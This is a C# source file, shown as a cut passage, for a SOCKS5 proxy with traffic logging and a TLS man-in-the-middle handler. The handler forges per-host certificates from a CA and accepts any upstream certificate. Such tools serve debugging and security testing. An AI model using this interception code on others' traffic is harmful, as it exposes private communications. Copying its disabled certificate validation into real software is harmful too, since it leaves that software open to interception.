                                                string url = (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                                                    ? target
                                                    : $"http://{host}{target}";
                                                httpRequestShown = true;
                                                PostUi($"HTTP request: {method} {url}");
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }

                void RemoteToClientInspector(byte[] buf, int off, int len)
                {
                    AppendInspect(remoteToClientInspect, buf, off, len);

                    try
                    {
                        var arr = remoteToClientInspect.ToArray();
                        string maybeText = null;
                        try { maybeText = Encoding.ASCII.GetString(arr); } catch { maybeText = null; }

                        if (!string.IsNullOrEmpty(maybeText))
                        {
                            int headerEnd = maybeText.IndexOf("\r\n\r\n", StringComparison.Ordinal);
                            if (headerEnd >= 0)
                            {
                                string headers = maybeText.Substring(0, headerEnd);
                                PostUi($"HTTP headers detected: {Trunc(headers, 400)}");

                                bool isGzip = headers.IndexOf("Content-Encoding: gzip", StringComparison.OrdinalIgnoreCase) >= 0;
                                bool isDeflate = headers.IndexOf("Content-Encoding: deflate", StringComparison.OrdinalIgnoreCase) >= 0;
                                bool isBrotli = headers.IndexOf("Content-Encoding: br", StringComparison.OrdinalIgnoreCase) >= 0;

                                int contentLength = 0;
                                bool hasContentLength = false;
                                foreach (var line in headers.Split(new[] { "\r\n" }, StringSplitOptions.None))
                                {
                                    if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
                                    {
                                        int.TryParse(line.Substring(15).Trim(), out contentLength);
                                        hasContentLength = true;
                                        break;
                                    }
                                }

                                byte[] bodyBytes = arr.Skip(headerEnd + 4).ToArray();

                                if (!hasContentLength)
                                {
                                    // If Transfer-Encoding: chunked, try to decode chunked body (best effort)
                                    if (headers.IndexOf("Transfer-Encoding: chunked", StringComparison.OrdinalIgnoreCase) >= 0)
                                    {
                                        try
                                        {
                                            var decoded = TryDecodeChunked(bodyBytes);
                                            if (decoded != null) bodyBytes = decoded;
                                        }
                                        catch { /* ignore */ }
                                    }
                                }

                                if (isGzip)
                                {
                                    try
                                    {
                                        using (var ms = new MemoryStream(bodyBytes))
                                        using (var gz = new GZipStream(ms, CompressionMode.Decompress))
                                        using (var dec = new MemoryStream())
                                        {
                                            gz.CopyTo(dec);
                                            string html = Encoding.UTF8.GetString(dec.ToArray());
                                            PostUi($"Decompressed body: {Trunc(html, 1000)}");
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        PostUi($"GZIP decompress failed: {ex.Message}");
                                    }
                                }
                                else if (isDeflate)
                                {
                                    try
                                    {
                                        using (var ms = new MemoryStream(bodyBytes))
                                        using (var df = new DeflateStream(ms, CompressionMode.Decompress))
                                        using (var dec = new MemoryStream())
                                        {
                                            df.CopyTo(dec);
                                            string html = Encoding.UTF8.GetString(dec.ToArray());
                                            PostUi($"Deflate body: {Trunc(html, 1000)}");
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        PostUi($"Deflate decompress failed: {ex.Message}");
                                    }
                                }
                                else if (isBrotli)
                                {
                                    // Try to use BrotliStream if available; otherwise report
                                    try
                                    {
                                        Type brotliType = Type.GetType("System.IO.Compression.BrotliStream, System.IO.Compression");
                                        if (brotliType == null)
                                        {
                                            // Might be available in System.IO.Compression (for .NET Core); try the common assembly name
                                            brotliType = Type.GetType("System.IO.Compression.BrotliStream, System.IO.Compression");
                                        }

                                        if (brotliType != null)
                                        {
                                            // Use reflection to construct BrotliStream if present
                                            using (var ms = new MemoryStream(bodyBytes))
                                            {
                                                // attempt direct use if type present in current runtime
                                                // fallback: try to create BrotliStream via known constructor (Stream, CompressionMode)
                                                var ctor = brotliType.GetConstructor(new Type[] { typeof(Stream), typeof(CompressionMode) });
                                                if (ctor != null)
                                                {
                                                    var brotliObj = ctor.Invoke(new object[] { ms, CompressionMode.Decompress }) as Stream;
                                                    if (brotliObj != null)
                                                    {
                                                        using (var brStream = brotliObj)
                                                        using (var dec = new MemoryStream())
                                                        {
                                                            brStream.CopyTo(dec);
                                                            string html = Encoding.UTF8.GetString(dec.ToArray());
                                                            PostUi($"Brotli body: {Trunc(html, 1000)}");
                                                        }
                                                    }
                                                    else
                                                    {
                                                        PostUi("BrotliStream present but constructor invocation failed.");
                                                    }
                                                }
                                                else
                                                {
                                                    PostUi("BrotliStream type present but expected constructor not found.");
                                                }
                                            }
                                        }
                                        else
                                        {
                                            PostUi("Content-Encoding: br encountered, but Brotli not available in this runtime.");
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        PostUi("Brotli decompress failed: " + ex.Message);
                                    }
                                }
                                else
                                {
                                    // not compressed: show as UTF-8 or summary
                                    if (LooksLikeText(bodyBytes))
                                    {
                                        string bodyText = null;
                                        try { bodyText = Encoding.UTF8.GetString(bodyBytes); } catch { try { bodyText = Encoding.ASCII.GetString(bodyBytes); } catch { bodyText = null; } }
                                        if (!string.IsNullOrEmpty(bodyText))
                                            PostUi("Body: " + Trunc(bodyText, 1000));
                                        else
                                            PostUi($"Body: {bodyBytes.Length} bytes (text decode failed)");
                                    }
                                    else
                                    {
                                        PostUi($"Body: {bodyBytes.Length} bytes (binary)");
                                    }
                                }

                                remoteToClientInspect = new MemoryStream();
                            }
                            else
                            {
                                if (arr.Length > 64 && !previewShownRemote)
                                {
                                    previewShownRemote = true;
                                    if (LooksLikeText(arr))
                                    {
                                        string preview = null;
                                        try { preview = Encoding.UTF8.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { try { preview = Encoding.ASCII.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { } }
                                        if (!string.IsNullOrEmpty(preview)) PostUi($"Remote payload preview: {Trunc(preview, 200)}");
                                    }
                                    else
                                    {
                                        string hex = BitConverter.ToString(arr, 0, Math.Min(arr.Length, 64)).Replace("-", " ");
                                        PostUi($"Remote payload preview (hex): {Trunc(hex, 100)}");
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }

                var t1 = CopyAndInspectAsync(clientStream, remoteStream, clientToRemoteInspect, ClientToRemoteInspector, cts.Token);
                var t2 = CopyAndInspectAsync(remoteStream, clientStream, remoteToClientInspect, RemoteToClientInspector, cts.Token);

                await Task.WhenAny(t1, t2);
                cts.Cancel();
                await Task.WhenAll(Task.WhenAll(t1.ContinueWith(_ => { }), t2.ContinueWith(_ => { })), Task.Delay(50));
            }
            finally
            {
                try { clientStream.Close(); } catch { }
                try { remoteStream.Close(); } catch { }
                try { remoteClient.Close(); } catch { }
                try { clientSock.Close(); } catch { }

                if (lvi != null) listView1?.BeginInvoke((MethodInvoker)(() => lvi.Remove()));
            }
        }

        // ---------- UDP Relay (enhanced) ----------
        private async Task HandleUdpRelay(UdpClient udpRelay)
        {
            var clientBuffers = new Dictionary<IPEndPoint, List<Tuple<byte, byte[]>>>(); // per-client frag list
            var udpClientPool = new Dictionary<string, UdpClient>();

            Action<string> PostUi = (text) =>
            {
                try
                {
                    string show = text.Length > UI_TRUNCATE_GLOBAL ? text.Substring(0, UI_TRUNCATE_GLOBAL) + "…(truncated)" : text;
                    listView1?.BeginInvoke((MethodInvoker)(() =>
                    {
                        listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                        //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                        //if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                    }));
                }
                catch { }
            };

            string TruncLocal(string s, int max) { if (string.IsNullOrEmpty(s)) return s; return s.Length <= max ? s : s.Substring(0, max) + "…"; }

            bool LooksLikeTextLocal(byte[] data)
            {
                if (data == null || data.Length == 0) return false;
                int printable = 0;
                int toCheck = Math.Min(data.Length, 200);
                for (int i = 0; i < toCheck; i++)
                {
                    byte b = data[i];
                    if (b >= 0x20 && b <= 0x7E) printable++;
                    else if (b == 0x09 || b == 0x0A || b == 0x0D) printable++;
                }
                return ((double)printable) / toCheck > 0.90;
            }

            string HexPreview(byte[] data, int maxBytes = 64)
            {
                int n = Math.Min(data.Length, maxBytes);
                var hex = BitConverter.ToString(data, 0, n).Replace("-", " ");
                if (data.Length > n) hex += " …";
                return hex.ToLowerInvariant();
            }

            string TryParseDnsQueryName(byte[] payload)
            {
                try
                {
                    if (payload == null || payload.Length < 12) return null;
                    int qdcount = (payload[4] << 8) | payload[5];
                    if (qdcount == 0) return null;
                    int pos = 12;
                    var labels = new List<string>();
                    while (pos < payload.Length)
                    {
                        int len = payload[pos++];
                        if (len == 0) break;
                        if (len + pos > payload.Length) return null;
                        string label = Encoding.ASCII.GetString(payload, pos, len);
                        labels.Add(label);
                        pos += len;
                    }
                    return labels.Count > 0 ? string.Join(".", labels) : null;
                }
                catch { return null; }
            }

            try
            {
                PostUi("UDP relay enhanced started...");

                while (true)
                {
                    var result = await udpRelay.ReceiveAsync();
                    var data = result.Buffer;
                    var clientEp = result.RemoteEndPoint;

                    if (data == null || data.Length < 10) { PostUi($"UDP packet too small: {data?.Length ?? 0} bytes"); continue; }

                    int offset = 0;
                    ushort rsv = (ushort)((data[offset] << 8) | data[offset + 1]); offset += 2;
                    byte frag = data[offset++];
                    byte atyp = data[offset++];

                    string destAddr = "";
                    int destPort = 0;

                    if (atyp == 0x01)
                    {
                        if (offset + 4 > data.Length) continue;
                        destAddr = new IPAddress(new byte[] { data[offset], data[offset + 1], data[offset + 2], data[offset + 3] }).ToString();
                        offset += 4;
                    }
                    else if (atyp == 0x03)
                    {
                        int len = data[offset++];
                        if (offset + len > data.Length) continue;
                        destAddr = Encoding.ASCII.GetString(data, offset, len);
                        offset += len;
                    }
                    else if (atyp == 0x04)
                    {
                        if (offset + 16 > data.Length) continue;
                        destAddr = new IPAddress(data.Skip(offset).Take(16).ToArray()).ToString();
                        offset += 16;
                    }
                    else { PostUi($"Unsupported ATYP {atyp}"); continue; }

                    if (offset + 2 > data.Length) continue;
                    destPort = (data[offset] << 8) | data[offset + 1]; offset += 2;
                    byte[] payload = data.Skip(offset).ToArray();

                    if (frag != 0)
                    {
                        List<Tuple<byte, byte[]>> list;
                        if (!clientBuffers.TryGetValue(clientEp, out list))
                        {
                            list = new List<Tuple<byte, byte[]>>();
                            clientBuffers[clientEp] = list;
                        }
                        list.Add(Tuple.Create(frag, payload));
                        PostUi($"Fragmented UDP packet stored (FRAG={frag}) for {clientEp}->{destAddr}:{destPort}");
                        continue;
                    }
                    else if (clientBuffers.ContainsKey(clientEp) && clientBuffers[clientEp].Count > 0)
                    {
                        var fragments = clientBuffers[clientEp];
                        var totalLen = fragments.Sum(f => f.Item2.Length) + payload.Length;
                        byte[] fullPayload = new byte[totalLen];
                        int p = 0;
                        foreach (var f in fragments) { Array.Copy(f.Item2, 0, fullPayload, p, f.Item2.Length); p += f.Item2.Length; }
                        Array.Copy(payload, 0, fullPayload, p, payload.Length);
                        payload = fullPayload;
                        clientBuffers[clientEp].Clear();
                        clientBuffers.Remove(clientEp);
                        PostUi($"Reassembled UDP payload length={payload.Length} for {clientEp}->{destAddr}:{destPort}");
                    }

                    // QUIC Initial (best-effort) - check SNI in ClientHello inside QUIC
                    if (payload.Length > 5 && (payload[0] & 0xC0) == 0xC0)
                    {
                        try
                        {
                            var sni = TryParseSni(payload);
                            if (!string.IsNullOrEmpty(sni))
                                PostUi($"QUIC Initial packet: SNI={sni} from {clientEp}");
                        }
                        catch { }
                    }

                    PostUi($"UDP -> {destAddr}:{destPort}, {payload.Length} bytes");
                    if (payload.Length == 0) { PostUi("Payload empty"); }
                    else if (LooksLikeTextLocal(payload))
                    {
                        string txt = null;
                        try { txt = Encoding.UTF8.GetString(payload); } catch { try { txt = Encoding.ASCII.GetString(payload); } catch { } }
                        PostUi($"Payload (text preview): {TruncLocal(txt, 400)}");
                    }
                    else
                    {
                        PostUi($"Payload preview (hex): {HexPreview(payload, 80)}");
                    }

                    if (destPort == 53)
                    {
                        string qname = TryParseDnsQueryName(payload);
                        if (!string.IsNullOrEmpty(qname)) PostUi($"DNS query for: {qname}");
                    }

                    string poolKey = destAddr + ":" + destPort;
                    UdpClient remoteUdp = null;
                    if (!udpClientPool.TryGetValue(poolKey, out remoteUdp))
                    {
                        remoteUdp = new UdpClient();
                        udpClientPool[poolKey] = remoteUdp;
                    }

                    try
                    {
                        await remoteUdp.SendAsync(payload, payload.Length, destAddr, destPort);
                        var recvTask = remoteUdp.ReceiveAsync();
                        var completed = await Task.WhenAny(recvTask, Task.Delay(5000));
                        if (completed == recvTask)
                        {
                            var resp = recvTask.Result;
                            byte[] remotePayload = resp.Buffer;

                            byte respAtyp = (byte)(resp.RemoteEndPoint.Address.AddressFamily == AddressFamily.InterNetwork ? 0x01 : 0x04);
                            byte[] addrBytes = resp.RemoteEndPoint.Address.GetAddressBytes();
                            byte[] portBytes = new byte[] { (byte)(resp.RemoteEndPoint.Port >> 8), (byte)(resp.RemoteEndPoint.Port & 0xFF) };
                            byte[] respPacket = new byte[3 + 1 + addrBytes.Length + 2 + remotePayload.Length];
                            int ro = 0; respPacket[ro++] = 0x00; respPacket[ro++] = 0x00; respPacket[ro++] = 0x00; respPacket[ro++] = respAtyp;
                            Array.Copy(addrBytes, 0, respPacket, ro, addrBytes.Length); ro += addrBytes.Length;
                            respPacket[ro++] = portBytes[0]; respPacket[ro++] = portBytes[1];
                            Array.Copy(remotePayload, 0, respPacket, ro, remotePayload.Length);

                            await udpRelay.SendAsync(respPacket, respPacket.Length, clientEp);

                            int rlen = remotePayload.Length;
                            if (rlen == 0) PostUi($"Response from {resp.RemoteEndPoint}: empty");
                            else if (LooksLikeTextLocal(remotePayload))
                            {
                                string textResp = null;
                                try { textResp = Encoding.UTF8.GetString(remotePayload); } catch { try { textResp = Encoding.ASCII.GetString(remotePayload); } catch { } }
                                PostUi($"Response from {resp.RemoteEndPoint} (text preview): {TruncLocal(textResp, 400)}");
                            }
                            else
                            {
                                PostUi($"Response from {resp.RemoteEndPoint} (hex preview): {HexPreview(remotePayload, 80)}");
                            }
                        }
                        else PostUi($"No response from {destAddr}:{destPort} (timeout)");
                    }
                    catch (Exception ex) { PostUi($"UDP forward error: {ex.Message}"); }
                }
            }
            catch (Exception ex) { PostUi("UDP relay error: " + ex.Message); }
        }

        // Helpers used across the class
        private static string Trunc(string s, int max)
        {
            if (string.IsNullOrEmpty(s)) return s;
            return s.Length <= max ? s : s.Substring(0, max) + "…";
        }

        private static bool LooksLikeText(byte[] data)
        {
            int printable = 0;
            foreach (var b in data)
            {
                if (b == 9 || b == 10 || b == 13) { printable++; continue; }
                if (b >= 32 && b <= 126) printable++;
            }
            return data.Length == 0 ? false : (printable / (double)data.Length) > 0.9;
        }

        private static byte[] TryDecodeChunked(byte[] data)
        {
            try
            {
                var msIn = new MemoryStream(data);
                var msOut = new MemoryStream();
                var sr = new StreamReader(msIn, Encoding.ASCII);
                while (true)
                {
                    string line = sr.ReadLine();
                    if (line == null) break;
                    int semi = line.IndexOf(';');
                    string lenStr = (semi >= 0) ? line.Substring(0, semi) : line;
                    int len = Convert.ToInt32(lenStr.Trim(), 16);
                    if (len == 0) break;
                    int readPos = (int)msIn.Position;
                    var buffer = new byte[len];
                    int got = msIn.Read(buffer, 0, len);
                    if (got > 0) msOut.Write(buffer, 0, got);
                    // consume CRLF
                    if (msIn.ReadByte() == '\r' && msIn.ReadByte() == '\n') { }
                }
                return msOut.ToArray();
            }
            catch
            {
                return null;
            }
        }

        private async Task<bool> StartNegotiation(Socket clientSock)
        {
            byte[] version = await RecvAll(clientSock, 1);
            if (version == null || version[0] != 5) return false;
            byte[] nMethods = await RecvAll(clientSock, 1);
            if (nMethods == null) return false;
            byte[] methods = await RecvAll(clientSock, nMethods[0]);
            if (methods == null) return false;
            await clientSock.SendAsync(new ArraySegment<byte>(new byte[] { 5, 0 }), SocketFlags.None);
            return true;
        }

        private async Task SendSocksReply(Socket sock, byte replyCode, IPAddress bindAddr = null, ushort bindPort = 0)
        {
            if (bindAddr == null) bindAddr = IPAddress.Any;
            byte[] addrBytes = bindAddr.GetAddressBytes();
            byte[] portBytes = new byte[2] { (byte)(bindPort >> 8), (byte)(bindPort & 0xFF) };
            byte[] reply = new byte[10] { 5, replyCode, 0, 1, addrBytes[0], addrBytes[1], addrBytes[2], addrBytes[3], portBytes[0], portBytes[1] };
            await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
        }

        private async Task<byte[]> RecvAll(Socket sock, int size)
        {
            byte[] data = new byte[size];
            int received = 0;
            while (received < size)
            {
                int r = await sock.ReceiveAsync(new ArraySegment<byte>(data, received, size - received), SocketFlags.None);
                if (r == 0) return null;
                received += r;
            }
            return data;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int port = int.Parse(textBox1.Text);
            _acceptCts = new CancellationTokenSource();
            _acceptLoopTask = AcceptLoop(port, _acceptCts.Token);
            button1.Enabled = false;
            button2.Enabled = true;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
            if (_acceptLoopTask != null) await Task.WhenAny(_acceptLoopTask, Task.Delay(500));
            button1.Enabled = true;
            button2.Enabled = false;
        }

        private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();

            try { _mitmHandler?.Dispose(); } catch { }
        }

        private void textBox2_TextChanged(object sender, EventArgs e) { }

        private void Reverse_Proxy_Load(object sender, EventArgs e)
        {
            listView1.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView1, true, null);
        }

        private void copySelectedItemsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0) return;

            var sb = new StringBuilder();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var line = string.Join("\t", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(s => s.Text));
                sb.AppendLine(line);
            }
            string textToCopy = sb.ToString();

            Thread staThread = new Thread(() =>
            {
                try { Clipboard.SetText(textToCopy); }
                catch (Exception ex) { MessageBox.Show($"Clipboard copy failed: {ex.Message}"); }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
        }

        private void ListView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var hit = listView1.HitTest(e.Location);
                if (hit.Item != null)
                {
                    if (!hit.Item.Selected)
                    {
                        listView1.SelectedItems.Clear();
                        hit.Item.Selected = true;
                    }
                }
                else
                {
                    listView1.SelectedItems.Clear();
                }
            }
        }

        private void PostUi(string text)
        {
            try
            {
                string show = text.Length > UI_TRUNCATE_GLOBAL ? text.Substring(0, UI_TRUNCATE_GLOBAL) + "…(truncated)" : text;
                listView1?.BeginInvoke((MethodInvoker)(() =>
                {
                    listView1.Items.Add($"[{DateTime.Now:HH:mm:ss}] {show}");
                    //listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                    //if (listView1.Items.Count > 0) listView1.EnsureVisible(listView1.Items.Count - 1);
                }));
            }
            catch { }
        }

        // Minimal SNI parser used in UDP QUIC initial attempts
        private static string TryParseSni(byte[] data)
        {
            try
            {
                if (data == null || data.Length < 5) return null;
                int pos = 0;
                if (data[pos++] != 0x16) return null;
                pos += 2;
                if (pos + 2 > data.Length) return null;
                int recLen = (data[pos] << 8) | data[pos + 1];
                pos += 2;
                if (pos + recLen > data.Length) return null;
                if (pos + 4 > data.Length) return null;
                byte hsType = data[pos++];
                if (hsType != 0x01) return null;
                int hsLen = (data[pos] << 16) | (data[pos + 1] << 8) | data[pos + 2]; pos += 3;
                pos += 2 + 32;
                int sessionIdLen = data[pos++]; pos += sessionIdLen;
                int csLen = (data[pos] << 8) | data[pos + 1]; pos += 2 + csLen;
                int compLen = data[pos++]; pos += compLen;
                int extLen = (data[pos] << 8) | data[pos + 1]; pos += 2;
                int extEnd = pos + extLen;
                while (pos + 4 <= extEnd)
                {
                    int extType = (data[pos] << 8) | data[pos + 1];
                    int extLength = (data[pos + 2] << 8) | data[pos + 3];
                    pos += 4;
                    if (extType == 0x00)
                    {
                        int sPos = pos;
                        if (sPos + 2 > pos + extLength) break;
                        int listLen = (data[sPos] << 8) | data[sPos + 1]; sPos += 2;
                        int listEnd = sPos + listLen;
                        while (sPos + 3 <= listEnd)
                        {
                            byte nameType = data[sPos++];
                            int nameLen = (data[sPos] << 8) | data[sPos + 1];
                            sPos += 2;
                            if (nameType == 0)
                            {
                                return Encoding.ASCII.GetString(data, sPos, nameLen);
                            }
                            sPos += nameLen;
                        }
                        break;
                    }
                    pos += extLength;
                }
            }
            catch { }
            return null;
        }

        /// <summary>
        /// MITM helper: creates per-host leaf certs signed by provided CA, performs SslStream handshake to client and upstream,
        /// and pipes plaintext between the two SslStreams. Includes a simple cert cache and HTTP body preview (handles gzip/deflate/br and chunked).
        /// </summary>

        public class MitmHandler : IDisposable
        {
            private readonly X509Certificate2 _ca; // CA PFX with private key (must be loaded with private key)
            private readonly ConcurrentDictionary<string, X509Certificate2> _cache;
            private readonly Action<string> _log;
            private Reverse_Proxy form;

            // New: delegate to call fallback transparent tunnel
            // signature: (clientStream, host, port, cancellationToken)
            // new fields
            private readonly Func<Stream, string, int, CancellationToken, Task> _transparentFallback = null;

            // inside your MitmHandler class (append alongside the existing constructor)
            public MitmHandler(X509Certificate2 caPfx, Action<string> logger = null, Reverse_Proxy form = null)
                : this(caPfx, logger, null, form)
            {
                // Intentionally empty - constructor chaining does the work.
            }

            // New constructor that loads CA PFX from path (works on .NET Framework 4.8)
            public MitmHandler(string caPfxPath, string pfxPassword, Action<string> logger = null,
                               Func<Stream, string, int, CancellationToken, Task> transparentFallback = null, Reverse_Proxy form = null)
            {
                if (string.IsNullOrEmpty(caPfxPath)) throw new ArgumentNullException(nameof(caPfxPath));
                if (!File.Exists(caPfxPath)) throw new FileNotFoundException("CA PFX not found", caPfxPath);

                // Load PFX with Exportable flag so we can sign and then produce ephemeral certs
                var ca = new X509Certificate2(caPfxPath, pfxPassword,
                    X509KeyStorageFlags.Exportable | X509KeyStorageFlags.PersistKeySet);

                if (!ca.HasPrivateKey) throw new ArgumentException("CA PFX must contain private key", nameof(caPfxPath));

                _ca = ca;
                _cache = new ConcurrentDictionary<string, X509Certificate2>();
                _log = logger ?? (_ => { });
                _transparentFallback = transparentFallback; // nullable 
                this.form = form;
            }

            public MitmHandler(X509Certificate2 caPfx, Action<string> logger, Func<Stream, string, int, CancellationToken, Task> transparentTunnelFallback, Reverse_Proxy form = null)
            {
                if (caPfx == null || !caPfx.HasPrivateKey) throw new ArgumentException("CA certificate with private key is required", nameof(caPfx));
                _ca = caPfx;
                _cache = new ConcurrentDictionary<string, X509Certificate2>();
                _log = logger ?? (_ => { });
                _transparentFallback = transparentTunnelFallback;
            }

            // Transparent fallback wrapper that accepts prefix bytes explicitly
            private async Task FallbackTransparent(Stream clientStream, string host, int port, byte[] prefixBytes, CancellationToken ct)
            {
                Stream streamToUse = clientStream;
                if (!(clientStream is PrependStream) && (prefixBytes != null && prefixBytes.Length > 0))
                    streamToUse = new PrependStream(prefixBytes, clientStream, _log);

                await this.form.TransparentTcpTunnel(streamToUse, host, port, ct).ConfigureAwait(false);
            }

            public void Dispose()
            {
                foreach (var kv in _cache)
                {
                    try { kv.Value?.Dispose(); } catch { }
                }
            }

            /// <summary>
            /// Return true if the provided ClientHello bytes indicate the client is requesting TLS 1.3
            /// by containing the Supported Versions extension (0x002B) with 0x03 0x04 listed.
            /// This is a permissive/safe detection sufficient for a MITM fallback decision.
            /// </summary>
            private static bool ClientHelloIndicatesTls13(byte[] hello)
            {
                if (hello == null || hello.Length < 5) return false;

                try
                {
                    int pos = 0;
                    // TLS record header (5 bytes)
                    if (hello[pos++] != 0x16) return false; // handshake
                                                            // read version (2 bytes) - skip
                    pos += 2;
                    int recLen = (hello[pos++] << 8) | hello[pos++];
                    if (recLen <= 0 || pos + recLen > hello.Length) return false;

                    // Handshake header
                    if (pos + 4 > hello.Length) return false;
                    byte hsType = hello[pos++];                       // should be 0x01 (ClientHello)
                    if (hsType != 0x01) return false;
                    int hsLen = (hello[pos++] << 16) | (hello[pos++] << 8) | hello[pos++]; // 3 bytes
                    if (hsLen <= 0 || pos + hsLen > hello.Length) return false;

                    // Skip: client version (2) + random (32)
                    pos += 2 + 32;
                    // session id
                    if (pos >= hello.Length) return false;
                    int sessionIdLen = hello[pos++];
                    pos += sessionIdLen;
                    if (pos + 2 > hello.Length) return false;

                    // skip cipher suites
                    int csLen = (hello[pos++] << 8) | hello[pos++];
                    pos += csLen;
                    if (pos >= hello.Length) return false;

                    // skip compression methods
                    int compLen = hello[pos++];
                    pos += compLen;
                    if (pos + 2 > hello.Length) return false;

                    // extensions length
                    int extLen = (hello[pos++] << 8) | hello[pos++];
                    int extEnd = pos + extLen;
                    if (extLen <= 0 || extEnd > hello.Length) return false;

                    while (pos + 4 <= extEnd)
                    {
                        int extType = (hello[pos++] << 8) | hello[pos++];      // 2 bytes
                        int extLength = (hello[pos++] << 8) | hello[pos++];    // 2 bytes
                        if (pos + extLength > extEnd) break;

                        if (extType == 0x002B) // supported_versions extension
                        {
                            // extData may be length-prefixed vector: search for 0x03 0x04 inside
                            for (int i = 0; i + 1 < extLength; i++)
                            {
                                if (hello[pos + i] == 0x03 && hello[pos + i + 1] == 0x04) return true;
                            }
                        }

                        pos += extLength;
                    }
                }
                catch
                {
                    // parsing failure -> be conservative and return false (do MITM if other conditions allow)
                }

                return false;
            }

            // ----------------------------------------------------------------------
            // MITM handler (caller has probed and passes the serverSelectedProtocol).
            // If serverSelectedProtocol == Tls13 => it will fallback to transparent.
            // prefixBytes: the captured ClientHello (so fallback can replay it).
            // ----------------------------------------------------------------------
            public async Task HandleMitmAsync(Stream clientCombinedStream, string sniHost, byte[] prefixBytes, SslProtocols probedProtocol, CancellationToken ct = default)
            {
                if (clientCombinedStream == null) throw new ArgumentNullException(nameof(clientCombinedStream));
                if (string.IsNullOrEmpty(sniHost)) sniHost = "localhost";

                // helper to unwrap PrependStream if fallback needs the raw inner stream
                Stream UnwrapIfPrepend(Stream s)
                {
                    var ps = s as PrependStream;
                    return ps != null ? ps.InnerStream : s;
                }

                // If server selected TLS1.3 we do not attempt MITM here
                if (probedProtocol == SslProtocols.Tls13)
                {
                    _log($"Upstream negotiated protocol for {sniHost}: Tls13. Skipping MITM and using transparent tunnel.");
                    await FallbackTransparent(UnwrapIfPrepend(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
                    return;
                }

                _log($"Upstream negotiated protocol for {sniHost}: {probedProtocol}. Proceeding with MITM.");

                // Create/get leaf cert for the host (you must provide implementation)
                X509Certificate2 leafCert;
                try
                {
                    // Implement/Get this function to create ephemeral certs (example existed in your code)
                    leafCert = GetOrCreateCertForHost(sniHost);
                    if (leafCert == null) throw new InvalidOperationException("GetOrCreateCertForHost returned null");
                }
                catch (Exception ex)
                {
                    _log($"MITM failed creating cert for {sniHost}: {ex.Message}");
                    await FallbackTransparent(UnwrapIfPrepend(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
                    return;
                }

                // Authenticate to client using forged leaf certificate. Limit to TLS1.2 for server-side.
                SslStream clientSsl = null;
                try
                {
                    clientSsl = new SslStream(clientCombinedStream, leaveInnerStreamOpen: true);
                    await clientSsl.AuthenticateAsServerAsync(leafCert, clientCertificateRequired: false,
                        enabledSslProtocols: SslProtocols.Tls12, checkCertificateRevocation: false).ConfigureAwait(false);

                    _log($"Authenticated to client for {sniHost}. Protocol: {clientSsl.SslProtocol}");
                }
                catch (Exception ex)
                {
                    _log($"Failed to authenticate to client (MITM). Falling back to transparent tunnel: {ex.Message}");
                    try { clientSsl?.Dispose(); } catch { }
                    await FallbackTransparent(UnwrapIfPrepend(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
                    return;
                }

                // Connect to upstream fresh (do not replay ClientHello to upstream for MITM).
                TcpClient remote = null;
                SslStream remoteSsl = null;
                try
                {
                    remote = new TcpClient();
                    await remote.ConnectAsync(sniHost, 443).ConfigureAwait(false);
                    var remoteNet = remote.GetStream();
                    remoteSsl = new SslStream(remoteNet, leaveInnerStreamOpen: false,
                        userCertificateValidationCallback: (sender, cert, chain, errors) => true);

                    // Authenticate to upstream using TLS1.2 since serverSelectedProtocol indicated TLS1.2
                    await remoteSsl.AuthenticateAsClientAsync(sniHost, null, SslProtocols.Tls12, checkCertificateRevocation: false).ConfigureAwait(false);

                    _log($"Connected to upstream {sniHost}. Protocol: {remoteSsl.SslProtocol}");
                }
                catch (Exception ex)
                {
                    _log($"Failed to connect/authenticate to upstream {sniHost}: {ex.Message}");
                    try { remoteSsl?.Close(); } catch { }
                    try { remote?.Close(); } catch { }
                    try { clientSsl?.Close(); } catch { }

                    await FallbackTransparent(UnwrapIfPrepend(clientCombinedStream), sniHost, 443, prefixBytes, ct).ConfigureAwait(false);
                    return;
                }

                // Start two directional pipes and shut them down cleanly
                var pipeCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                Task t1 = null, t2 = null;
                try
                {
                    t1 = PipePlainAsync(clientSsl, remoteSsl, pipeCts.Token, true);  // client -> server
                    t2 = PipePlainAsync(remoteSsl, clientSsl, pipeCts.Token, false); // server -> client

                    try
                    {
                        await Task.WhenAll(t1, t2).ConfigureAwait(false);
                        _log("Both C->S and S->C pipes finished.");
                    }
                    catch (Exception ex)
                    {
                        _log($"Pipe orchestration error: {ex.Message}");
                    }

                    // give the other side a short moment (optional)
                    // await Task.Delay(50).ConfigureAwait(false);
                }
                catch (Exception ex)
                {
                    _log($"Pipe orchestration error: {ex.Message}");
                }
                finally
                {
                    // request both pipes to stop
